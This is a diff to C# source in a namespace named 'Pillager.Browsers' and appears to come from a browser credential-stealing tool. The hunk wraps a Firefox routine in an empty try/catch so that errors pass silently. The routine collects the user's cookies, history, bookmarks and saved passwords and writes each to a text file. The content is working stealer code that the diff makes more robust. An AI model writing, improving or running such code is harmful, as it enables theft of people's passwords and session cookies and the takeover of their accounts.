@@ -290,17 +290,21 @@ namespace Pillager.Browsers
         }
         public static void Save(string path)
         {
-            if (!Directory.Exists(BrowserPath)) return;
-            string savepath = Path.Combine(path, BrowserName);
-            Directory.CreateDirectory(savepath);
-            string cookies = FireFox_cookies();
-            string history = FireFox_history();
-            string books = FireFox_books();
-            string passwords = FireFox_passwords();
-            if (!String.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
-            if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
-            if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
-            if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
+            try
+            {
+                if (!Directory.Exists(BrowserPath)) return;
+                string savepath = Path.Combine(path, BrowserName);
+                Directory.CreateDirectory(savepath);
+                string cookies = FireFox_cookies();
+                string history = FireFox_history();
+                string books = FireFox_books();
+                string passwords = FireFox_passwords();
+                if (!String.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
+                if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
+                if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
+                if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
+            }
+            catch { }
         }
     }
 }
